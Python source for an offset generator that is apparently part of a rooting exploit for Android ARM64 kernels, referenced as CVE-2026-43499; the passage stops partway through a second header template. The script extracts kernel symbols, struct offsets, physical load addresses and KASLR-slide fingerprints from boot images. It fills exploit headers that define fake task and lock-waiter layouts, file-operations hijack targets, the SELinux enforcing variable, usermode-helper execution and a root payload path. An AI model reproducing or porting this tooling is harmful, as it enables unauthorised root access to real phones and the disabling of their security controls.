#!/usr/bin/env python3
"""Generate src/targets/<profile>/target.h and p0_fingerprint.h.

Derives every firmware-dependent constant from a raw Android boot.img plus
firmware load-address information. The physical load address comes from one
of:
  --xbl-config   Qualcomm xbl_config partition image: the DTB memory map
                 gives P0_PHYS_OFFSET (NOMAP region, 1 GiB aligned) and
                 P0_KERNEL_PHYS_LOAD (Kernel region).
  --sboot        decompressed Exynos sboot.bin: the "Starting kernel" jump
                 path (phys base + Image text_offset) gives
                 P0_KERNEL_PHYS_LOAD.
  --phys-offset / --kernel-phys   explicit overrides (always win).

Sources per value:
  KIMAGE_TEXT_BASE, *_OFF symbols      recovered ELF (vmlinux-to-elf + llvm-nm)
  struct/field offsets                 raw BTF blob inside the Image (bpftool)
  SLIDE_TRACEFS_EVENT_ID               __TRACE_LAST_TYPE + ftrace event index
  SLIDE_TRACEFS_WORKER_CALLER_OFF      worker_thread: bl schedule successor
  SLIDE_NFULNL_LOGGER_NAME_OFF         "nfnetlink_log" string image offset
  SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF  boot_id entry in random_table
  P0_PHYS_OFFSET/P0_KERNEL_PHYS_LOAD   xbl_config FDT memory map or sboot
  p0_fingerprint.h                     raw bytes at PROBE_OFFSET - slide

Pre-6.0 kernels (5.10/5.15): clang LTO mangles local symbols with .llvm.
suffixes (resolved automatically), there is no struct slab (slab_cache is
found inside struct page's anonymous union), and 16K-aligned KASLR slides
require 0x4000-step fingerprint rows; MM_STRUCT_SZ and the kmalloc cache
layout (KMALLOC_CGROUP_TYPE/KMALLOC_CACHE_TYPES) are emitted for the
5.15-style 3-cache layout.

Usage:
  generate_target.py --boot boot.img --profile P --fingerprint F \
      (--xbl-config xbl_config.elf | --sboot sboot.bin | --kernel-phys A)

required tools: vmlinux-to-elf, llvm-nm, llvm-objdump, bpftool, and
aarch64-linux-gnu-objdump (only when --sboot is given).
"""
import argparse
import hashlib
import os
import re
import gzip
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

P0_PAGE_OFFSET = 0xFFFFFF8000000000
DIRECT_MAP_END = 0xFFFFFF9000000000
VMEMMAP_START = 0xFFFFFFFE00000000
ARM64_MEMSTART_ALIGN = 1 << 30
PAGE_SIZE = 0x1000
FDT_MAGIC = struct.pack('>I', 0xD00DFEED)
FDT_BEG_NODE, FDT_END_NODE, FDT_PROP, FDT_NOP, FDT_END = 1, 2, 3, 4, 9


def run(cmd, **kw):
    return subprocess.run(cmd, check=True, text=True, capture_output=True,
                          **kw).stdout


def unpack_kernel(boot: Path) -> bytes:
    b = boot.read_bytes()
    if b[:8] != b'ANDROID!':
        raise SystemExit(f"{boot}: not an Android boot image")
    size = struct.unpack_from('<I', b, 0x08)[0]
    if not (0x1000 < size and size + 0x1000 <= len(b)):
        raise SystemExit(f"{boot}: bad kernel_size 0x{size:x}")
    kernel = b[0x1000:0x1000 + size]
    if kernel[:2] == b'\x1f\x8b':
        kernel = gzip.decompress(kernel)
    if kernel[0x38:0x3C] != b'ARMd':
        raise SystemExit(f"{boot}: kernel is not an ARM64 Image")
    return kernel


def parse_version(kernel: bytes):
    m = re.search(rb'Linux version (\S+) \([^)]*\) ([^#]+) #1', kernel)
    if not m:
        raise SystemExit("no kernel version string found")
    release = m.group(1).decode()
    full = re.sub(r'\s+', ' ', m.group(2).decode())
    m = re.search(r'-ab([A-Za-z0-9]{4,24})(?:-|$)', release)
    return release, m.group(1) if m else None, full


def recover_symbols(elf: Path) -> dict:
    sym = {}
    for ln in run(['llvm-nm', '--numeric-sort', str(elf)]).splitlines():
        m = re.match(r'^([0-9a-f]+)\s+[A-Za-z]\s+(\S+)$', ln)
        if m:
            sym[m.group(2)] = int(m.group(1), 16)
    return sym


def has_symbol(sym: dict, name: str) -> bool:
    if name in sym:
        return True
    pref = name + '.llvm.'
    return any(k.startswith(pref) for k in sym)


def resolve_symbol(sym: dict, name: str) -> int:
    """Resolve a symbol, tolerating clang LTO local suffixes (.llvm.<id>).

    5.15 kernels built with LTO expose static functions as e.g.
    configfs_read_iter.llvm.8090890824163915520; match the bare name
    exactly first, then require a unique .llvm. variant.
    """
    if name in sym:
        return sym[name]
    pref = name + '.llvm.'
    hits = [v for k, v in sym.items() if k.startswith(pref)]
    if len(hits) == 1:
        return hits[0]
    if not hits:
        raise KeyError(name)
    raise SystemExit(f"ambiguous symbol {name}: {len(hits)} .llvm. variants")


def extract_btf(kernel: bytes, out: Path):
    cand = []
    cursor = 0
    while True:
        start = kernel.find(b'\x9f\xeb\x01\x00', cursor)
        if start < 0:
            break
        cursor = start + 1
        if start + 24 > len(kernel):
            continue
        magic, version, flags, hlen, type_off, type_len, str_off, str_len = \
            struct.unpack_from('<HBBIIIII', kernel, start)
        if magic != 0xEB9F or version != 1 or flags != 0 or hlen < 24:
            continue
        payload = max(type_off + type_len, str_off + str_len)
        end = start + hlen + payload
        sstr = start + hlen + str_off
        if end > len(kernel) or sstr >= end or kernel[sstr] != 0:
            continue
        cand.append((start, end))
    if len(cand) != 1:
        raise SystemExit(f"expected one raw BTF blob, found {cand}")
    start, end = cand[0]
    out.write_bytes(kernel[start:end])
    return start, end


def parse_btf(raw: str) -> dict:
    structs = {}
    cur = None
    for ln in raw.splitlines():
        m = re.match(r"^\[\d+\] STRUCT '([^']+)' size=(\d+) vlen=\d+", ln)
        if m:
            cur = m.group(1)
            structs.setdefault(cur, {})
            continue
        m = re.match(r"^\s+'([^']+)' type_id=\d+ bits_offset=(\d+)", ln)
        if m and cur is not None and m.group(1) != '(anon)':
            structs[cur].setdefault(m.group(1), int(m.group(2)) // 8)
    return structs


def struct_size(raw: str, name: str):
    m = re.search(r"^\[\d+\] STRUCT '%s' size=(\d+) vlen=\d+" % name, raw,
                  re.M)
    if not m:
        raise SystemExit(f"struct {name} missing from BTF")
    return int(m.group(1))


def parse_btf_udts(raw: str) -> dict:
    """Parse raw BTF dump into {type_id: ('STRUCT'|'UNION', [(name, tid,
    bit_offset), ...])} for nested anonymous-type walks."""
    udts = {}
    cur = None
    for ln in raw.splitlines():
        m = re.match(r"^\[(\d+)\] (STRUCT|UNION) '([^']*)' size=\d+ vlen=\d+",
                     ln)
        if m:
            cur = int(m.group(1))
            udts[cur] = (m.group(2), [])
            continue
        m = re.match(r"^\s+'([^']*)' type_id=(\d+) bits_offset=(\d+)", ln)
        if m and cur is not None:
            udts[cur][1].append((m.group(1), int(m.group(2)),
                                 int(m.group(3))))
    return udts


def nested_btf_member(raw: str, root: str, member: str):
    """Find a member buried in anonymous unions/structs, e.g.
    struct page -> (anon) -> (anon) -> slab_cache. Returns byte offset
    within the root type, or None. Only anonymous members are descended
    into, so named members elsewhere never shadow the walk."""
    udts = parse_btf_udts(raw)
    start = None
    for ln in raw.splitlines():
        m = re.match(r"^\[(\d+)\] STRUCT '(%s)' size=" % re.escape(root), ln)
        if m:
            start = int(m.group(1))
            break
    if start is None:
        return None
    seen = set()
    stack = [(start, 0)]
    while stack:
        tid, base = stack.pop()
        if tid in seen or tid not in udts:
            continue
        seen.add(tid)
        kind, mems = udts[tid]
        for name, m_tid, boff in mems:
            if name == member:
                return base + boff // 8
            if name == '(anon)':
                stack.append((m_tid, base + boff // 8))
    return None


def worker_caller_off(elf: Path, base: int, worker_name: str = 'worker_thread') -> int:
    dis = run(['llvm-objdump', f'--disassemble-symbols={worker_name}',
               str(elf)])
    succ = [int(a, 16) + 4 for a in re.findall(
        r'^([0-9a-f]+):\s+[0-9a-f]+\s+bl\s+0x[0-9a-f]+\s+<schedule>$', dis,
        re.M)]
    if not succ:
        raise SystemExit("no 'bl schedule' in worker_thread disassembly")
    return succ[-1] - base


def derive_kernel_phys(sboot: Path, objdump: str):
    s = sboot.read_bytes()
    sk = s.find(b'Starting kernel')
    if sk < 0:
        return None
    page, off = sk & ~0xFFF, sk & 0xFFF
    lines = run([objdump, '-D', '-b', 'binary', '-m', 'aarch64',
                 str(sboot)]).splitlines()
    print_idx = None
    for i, ln in enumerate(lines):
        m = re.match(r'^\s*[0-9a-f]+:\s+[0-9a-f]+\s+adrp\s+x(\d+),\s+'
                     r'0x%x\b' % page, ln)
        if not m:
            continue
        r = m.group(1)
        for j in range(i + 1, min(i + 5, len(lines))):
            if re.match(r'^\s*[0-9a-f]+:\s+[0-9a-f]+\s+add\s+x%s,\s+x%s,'
                        r'\s+#0x%x\b' % (r, r, off), lines[j]):
                print_idx = j
                break
        if print_idx is not None:
            break
    if print_idx is None:
        return None
    limit = min(print_idx + 32, len(lines))
    for i in range(print_idx + 1, limit):
        m = re.match(r'^\s*[0-9a-f]+:\s+[0-9a-f]+\s+add\s+x\d+,\s+x(\d+),'
                     r'\s+x(\d+)\s*$', lines[i])
        if not m:
            continue
        src_a, src_b = int(m.group(1)), int(m.group(2))
        w = min(16, i - print_idx)
        movs = []
        ldrs = []
        for j in range(i - 1, i - w - 1, -1):
            mm = re.search(r'\bmov\s+[wx](\d+),\s+'
                           r'#(-?0x[0-9a-f]+|\d+)(?:\s|/|$)', lines[j])
            if mm:
                const = int(mm.group(2), 0)
                if const < 0:
                    const &= 0xFFFFFFFF
                movs.append((int(mm.group(1)), const))
            ml = re.search(r'\bldr\s+[wx](\d+),\s+\[[^\]]+\]', lines[j])
            if ml:
                ldrs.append(int(ml.group(1)))
        for reg, const in movs:
            if reg not in (src_a, src_b):
                continue
            other = src_b if reg == src_a else src_a
            if other in ldrs:
                return const
    return None


class XblProfile:
    def __init__(self, phys_offset, kernel_phys_load, kernel_region_size,
                 dtb_offsets, sha256):
        self.phys_offset = phys_offset
        self.kernel_phys_load = kernel_phys_load
        self.kernel_region_size = kernel_region_size
        self.dtb_offsets = dtb_offsets
        self.sha256 = sha256


def parse_fdt_memory_map(data: bytes, off: int, total: int):
    """Parse one FDT; return {full node path: (base, size, label)}."""
    off_str = struct.unpack_from('>I', data, off + 12)[0]
    off_dt = struct.unpack_from('>I', data, off + 8)[0]
    p = off + off_dt
    end = off + total
    path = ""
    addrc = sizec = None
    regions = {}
    while p + 4 <= end:
        tok = struct.unpack_from('>I', data, p)[0]
        if tok == FDT_BEG_NODE:
            nlen = data.index(b'\x00', p + 4) - (p + 4)
            name = data[p + 4:p + 4 + nlen].decode('ascii', 'replace')
            path = f"{path}/{name}" if path else name
            p = (p + 4 + nlen + 1 + 3) & ~3
        elif tok == FDT_END_NODE:
            path = path.rsplit('/', 1)[0]
            p += 4
        elif tok == FDT_PROP:
            plen, noff = struct.unpack_from('>II', data, p + 4)
            s = off + off_str + noff
            nlen = data.index(b'\x00', s) - s
            name = data[s:s + nlen].decode('ascii', 'replace')
            val = data[p + 12:p + 12 + plen]
            if name == '#address-cells':
                addrc = struct.unpack_from('>I', val)[0]
            elif name == '#size-cells':
                sizec = struct.unpack_from('>I', val)[0]
            elif name == 'reg' and addrc and sizec:
                regions[path] = (int.from_bytes(val[:addrc * 4], 'big'),
                                 int.from_bytes(
                                     val[addrc * 4:addrc * 4 + sizec * 4],
                                     'big'), None)
            elif name == 'mem-label' and path in regions:
                base, size, _ = regions[path]
                regions[path] = (base, size,
                                 val.rstrip(b'\x00').decode('ascii'))
            p = (p + 12 + plen + 3) & ~3
        elif tok == FDT_NOP:
            p += 4
        elif tok == FDT_END:
            break
        else:
            raise SystemExit(f"xbl_config: malformed FDT at 0x{off:x}")
    return regions


def recover_xbl_profile(path: Path, image_size: int) -> XblProfile:
    data = path.read_bytes()
    if len(data) < 40:
        raise SystemExit(f"{path}: too small for an FDT header")
    pairs = []
    pos = 0
    while True:
        pos = data.find(FDT_MAGIC, pos)
        if pos < 0:
            break
        next_pos = pos + 4
        if pos + 8 > len(data):
            break
        total = struct.unpack_from('>I', data, pos + 4)[0]
        if total < 40 or total > len(data) - pos:
            pos = next_pos
            continue
        regions = parse_fdt_memory_map(data, pos, total)
        memory_map = {n: r for n, r in regions.items()
                      if '/memorymap/' in n or n.startswith('memorymap')}
        nomaps = {n: r for n, r in memory_map.items() if r[2] == 'NOMAP'}
        kernels = {n: r for n, r in memory_map.items() if r[2] == 'Kernel'}
        if len(nomaps) == 1 and len(kernels) == 1:
            pairs.append((pos, next(iter(nomaps.values())),
                          next(iter(kernels.values()))))
        pos = next_pos
    if not pairs:
        raise SystemExit(
            f"{path}: no DTB with a unique NOMAP/Kernel memory map pair "
            f"(parsed {len(pairs)} DTBs)")

    grouped = {}
    selected = {}
    for dtb_off, nomap, kernel in pairs:
        key = (nomap[0], nomap[1], kernel[0], kernel[1])
        grouped.setdefault(key, []).append(dtb_off)
        selected[key] = (nomap, kernel)
    if len(grouped) != 1:
        raise SystemExit(
            f"{path}: conflicting physical memory maps: "
            + ", ".join(f"dtb=[{', '.join(hex(o) for o in os)}]"
                        f" nomap=0x{k[0]:x}+0x{k[1]:x}"
                        f" kernel=0x{k[2]:x}+0x{k[3]:x}"
                        for k, os in grouped.items()))
    key, dtb_offsets = next(iter(grouped.items()))
    nomap, kernel = selected[key]
    phys_offset = nomap[0] & -ARM64_MEMSTART_ALIGN
    for label, (base, size, _) in (("NOMAP", nomap), ("Kernel", kernel)):
        if base & (PAGE_SIZE - 1) or size == 0 or size & (PAGE_SIZE - 1):
            raise SystemExit(
                f"{path}: XBL {label} region not 4K-aligned or empty: "
                f"base=0x{base:x} size=0x{size:x}")
        if base + size >= 1 << 64:
            raise SystemExit(f"{path}: XBL {label} region exceeds uint64")
    if not (phys_offset <= nomap[0] < phys_offset + ARM64_MEMSTART_ALIGN):
        raise SystemExit(f"{path}: NOMAP cannot close to a 1 GiB-aligned "
                         f"phys offset")
    if kernel[0] < phys_offset:
        raise SystemExit(f"{path}: Kernel region precedes phys offset")
    if image_size > kernel[1]:
        raise SystemExit(
            f"{path}: kernel Image (0x{image_size:x}) exceeds Kernel region "
            f"0x{kernel[1]:x}")
    return XblProfile(phys_offset, kernel[0], kernel[1],
                      tuple(dtb_offsets), hashlib.sha256(data).hexdigest())


def gen_fingerprint(kernel: bytes, probe: int, out: Path, desc: str,
                    inverse: bool = False, step: int = 0x10000):
    page_offsets = [0x000, 0x200, 0x400, 0x600, 0x800, 0xA00, 0xC00, 0xE00]
    rows = []
    for slide in range(0, probe + step, step):
        src = slide if inverse else probe - slide
        if src < 0:
            raise SystemExit(f"slide 0x{slide:x} exceeds probe 0x{probe:x}")
        rows.append((slide, [struct.unpack_from('<Q', kernel, src + po)[0]
                             for po in page_offsets]))
    for slide, words in rows:
        src = slide if inverse else probe - slide
        for i, po in enumerate(page_offsets):
            if struct.unpack_from('<Q', kernel, src + po)[0] != words[i]:
                raise SystemExit(f"readback mismatch for slide 0x{slide:x}")
    with out.open('w') as f:
        f.write("// Generated from the exact raw Image.\n")
        f.write(f"// Each row maps actual slide to Image[0x{probe:x} - slide].\n")
        if inverse:
            f.write("// APP_P0_FINGERPRINT_INVERSE_SLIDE=1: the row key is "
                    "the physical source offset; the runtime converts it "
                    "to a slide via probe - source.\n")
        f.write("#ifndef P0_FINGERPRINT_H\n#define P0_FINGERPRINT_H\n\n")
        f.write("#define P0_FINGERPRINT_WORDS 8\n\n")
        f.write("static const uint16_t p0_fingerprint_offsets"
                "[P0_FINGERPRINT_WORDS] = {\n")
        f.write("  0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00,\n")
        f.write("};\n\n")
        f.write("struct p0_fingerprint {\n  uintptr_t slide;\n"
                "  uint64_t words[P0_FINGERPRINT_WORDS];\n};\n\n")
        f.write("static const struct p0_fingerprint p0_fingerprints[] = {\n")
        for slide, words in rows:
            f.write(f"  {{ 0x{slide:06x}ULL, {{ {words[0]:#018x}ULL, "
                    f"{words[1]:#018x}ULL,")
            for i in range(2, 6, 2):
                f.write(f"\n    {words[i]:#018x}ULL, "
                        f"{words[i + 1]:#018x}ULL,")
            f.write(f"\n    {words[6]:#018x}ULL, "
                    f"{words[7]:#018x}ULL }} }},\n")
        f.write("};\n\n#endif\n")


TEMPLATE_STANDARD = r"""#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "__PROFILE__-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "__PROFILE__-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "__FINGERPRINT__"
#endif

#define KIMAGE_TEXT_BASE __BASE__
#define PHYS_P0_ORACLE 1
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET __PHYS_OFF__
#define P0_KERNEL_PHYS_LOAD __KERNEL_PHYS__
#define SKB_DATA_DELTA __SKB_DELTA__
__LEGACY_KERNEL__

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_TRACEFS_EVENT_ID __EVENT_ID__
#define SLIDE_TRACEFS_WORKER_CALLER_OFF __WORKER_CALL__ULL
#define SLIDE_PSELECT_WORD_SHIFT __PSELECT_SHIFT__
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32
__P0_INVERSE__

/* controlled-mm bank layout (used by the shared fops/oracle code in both
 * the app and NON_APP builds) */
#define SLIDE_BANK_SLOTS __BANK_SLOTS__
#define SLIDE_BANK_TASK_OFF __BANK_TASK_OFF__
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40

/* P0 oracle geometry (shared fops/oracle code uses these unguarded) */
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET __PROBE_OFF__
#define P0_FINGERPRINT_HEADER \
  "targets/__PROFILE__/p0_fingerprint.h"

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC __PSELECT_TIMEOUT__
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
  20000, 20000, 20000, 20000, 20000, 20000, 20000, 20000
#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC 25000, 20000, 30000, 50000
#define APP_FOPS_ROUTE_USE_PSELECT_DELAY 1
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* __BUILD__ offsets. */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF __UMH__ULL
#define NOOP_LLSEEK_OFF __NOOP_LLSEEK__ULL
#define COPY_SPLICE_READ_OFF __SPLICE__ULL
#define CONFIGFS_READ_ITER_OFF __CFG_READ__ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF __CFG_WRITE__ULL
#define ASHMEM_IOCTL_OFF __ASHMEM_IOCTL__ULL
#define ASHMEM_COMPAT_IOCTL_OFF __ASHMEM_COMPAT__ULL
#define ASHMEM_MMAP_OFF __ASHMEM_MMAP__ULL
#define ASHMEM_OPEN_OFF __ASHMEM_OPEN__ULL
#define ASHMEM_RELEASE_OFF __ASHMEM_REL__ULL
#define ASHMEM_SHOW_FDINFO_OFF __ASHMEM_FDINFO__ULL
#define ANON_PIPE_BUF_OPS_OFF __ANON_PIPE__ULL
#define ASHMEM_FOPS_OFF __ASHMEM_FOPS__ULL
#define KMALLOC_CACHES_OFF __KMALLOC__ULL
#define SYSTEM_UNBOUND_WQ_OFF __UNBOUND_WQ__ULL
#define INIT_TASK_OFF __INIT_TASK__ULL
#define ROOT_TASK_GROUP_OFF __ROOT_TG__ULL
#define SELINUX_ENFORCING_OFF __SELINUX__ULL
#define SYSCTL_BOOTID_OFF __SYSCTL_BOOTID__ULL
#define ASHMEM_MISC_OFF __ASHMEM_MISC__ULL

#define ASHMEM_MISC_FOPS_OFF (ASHMEM_MISC_OFF + 0x10ULL)
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

#define SLIDE_NFULNL_LOGGER_NAME_OFF __NFULNL_NAME__ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF __NFULNL_OBJ__ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF __BOOTID_DATA__ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF SYSCTL_BOOTID_OFF

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"

#define SIZEOF_FILE_OPERATIONS __FOPS_SIZE__
#define FOPS_OWNER_OFF __FOPS_OWNER__
#define FOPS_LLSEEK_OFF __FOPS_LLSEEK__
#define FOPS_READ_OFF __FOPS_READ__
#define FOPS_WRITE_OFF __FOPS_WRITE__
#define FOPS_READ_ITER_OFF __FOPS_READ_ITER__
#define FOPS_WRITE_ITER_OFF __FOPS_WRITE_ITER__
#define FOPS_UNLOCKED_IOCTL_OFF __FOPS_IOCTL__
#define FOPS_COMPAT_IOCTL_OFF __FOPS_COMPAT__
#define FOPS_MMAP_OFF __FOPS_MMAP__
#define FOPS_OPEN_OFF __FOPS_OPEN__
#define FOPS_RELEASE_OFF __FOPS_RELEASE__
#define FOPS_SPLICE_READ_OFF __FOPS_SPLICE_READ__
#define FOPS_SHOW_FDINFO_OFF __FOPS_SHOW_FDINFO__
#define FOPS_IOCTL_OFF FOPS_UNLOCKED_IOCTL_OFF

#define TASK_USAGE_OFF __TASK_USAGE__
#define TASK_PRIO_OFF __TASK_PRIO__
#define TASK_NORMAL_PRIO_OFF __TASK_NPRIO__
#define TASK_SCHED_TASK_GROUP_OFF __TASK_SCHED_TG__
#define TASK_PI_LOCK_OFF __TASK_PI_LOCK__
#define TASK_PI_WAITERS_OFF __TASK_PI_WAIT__
#define TASK_PI_TOP_TASK_OFF __TASK_PI_TOP__
#define TASK_PI_BLOCKED_ON_OFF __TASK_PI_BLOCKED__

#define SIZEOF_PAGE __PAGE_SIZE__
#define PAGE_COMPOUND_HEAD_OFF 0x08
#define PAGE_SLAB_CACHE_OFF __SLAB_CACHE__
#define PAGE_PAGE_TYPE_OFF 0x30
#define STRUCT_PAGE_SIZE SIZEOF_PAGE
#define STRUCT_PAGE_COMPOUND_HEAD_OFF PAGE_COMPOUND_HEAD_OFF
#define STRUCT_SLAB_CACHE_OFF PAGE_SLAB_CACHE_OFF
#define STRUCT_PAGE_TYPE_OFF PAGE_PAGE_TYPE_OFF

__FAKE_WAITER_MACROS__

#define WORK_DATA_OFF __WORK_DATA__
#define WORK_ENTRY_OFF __WORK_ENTRY__
#define WORK_FUNC_OFF __WORK_FUNC__

#define PWQ_POOL_OFF __PWQ_POOL__
#define PWQ_WQ_OFF __PWQ_WQ__
#define PWQ_WORK_COLOR_OFF __PWQ_COLOR__
#define PWQ_REFCNT_OFF __PWQ_REFCNT__
#define PWQ_NR_IN_FLIGHT_OFF __PWQ_INFLIGHT__
#define PWQ_NR_ACTIVE_OFF __PWQ_ACTIVE__
#define PWQ_MAX_ACTIVE_OFF __PWQ_MAXACT__

#define POOL_WORKLIST_OFF __POOL_WORKLIST__
#define POOL_NR_IDLE_OFF __POOL_NRIDLE__

#define WQ_DFL_PWQ_OFF __WQ_DFL_PWQ__

#define CFG_PAGE_OFF __CFG_PAGE__
#define CFG_NEEDS_READ_FILL_OFF __CFG_NEEDS__
#define CFG_BIN_BUFFER_OFF __CFG_BINBUF__
#define CFG_BIN_BUFFER_SIZE_OFF __CFG_BINSZ__
#define CFG_CB_MAX_SIZE_OFF __CFG_CBMAX__

#define FAKE_TASK_USAGE_OFF TASK_USAGE_OFF
#define FAKE_TASK_PRIO_OFF TASK_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_PI_LOCK_OFF TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF TASK_PI_WAITERS_OFF
#define FAKE_TASK_TASK_GROUP_OFF TASK_SCHED_TASK_GROUP_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#endif
"""

TEMPLATE_5_15 = r"""#ifndef OFFSET_H
#define OFFSET_H

/* ---------------------------------------------------------------------------
 * Target identity & build flags
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "__PROFILE__-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_MCAST

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "__FINGERPRINT__"
#endif

/* --- kmalloc layout (mm_struct slab shape) -------------------------------- */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ __MM_SZ__
#endif
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

/* ---------------------------------------------------------------------------
 * Route / build tuning
 * ------------------------------------------------------------------------- */
